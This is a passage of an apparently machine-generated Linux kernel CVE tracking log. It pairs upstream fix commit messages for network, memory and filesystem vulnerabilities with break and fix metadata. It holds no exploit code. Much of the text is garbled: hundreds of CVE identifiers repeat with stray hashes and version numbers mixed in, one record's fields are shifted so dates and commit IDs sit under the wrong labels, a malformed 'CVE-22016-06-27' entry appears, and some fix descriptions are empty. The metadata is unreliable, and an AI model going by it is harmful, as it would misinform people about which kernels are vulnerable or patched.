    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2014-0181:
CVE-2014-1739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3186:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3646:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-5045:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7970:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9585:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-1339:
CVE-2015-1573:
CVE-2015-2041:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-3291:
CVE-2015-4004:
CVE-2015-4177:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5283:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-6252:
CVE-2015-7550:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7872:
CVE-2015-7990:
CVE-2015-8215:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8767:
CVE-2015-8816:
CVE-2015-8944:
CVE-2015-8952:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-2053:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2782:
CVE-2016-3134:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3157:
CVE-2016-3713:
CVE-2016-3857:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-5195:
CVE-2016-5244:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5828:
CVE-2016-6136:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
3.14.78:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5828:
CVE-2016-6136:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-6136:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-22016-06-27:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5828:
CVE-2016-6136:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-6136:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5828:
CVE-2016-6136:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5195:
CVE-2016-5244:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5828:
CVE-2016-6136:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6197:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
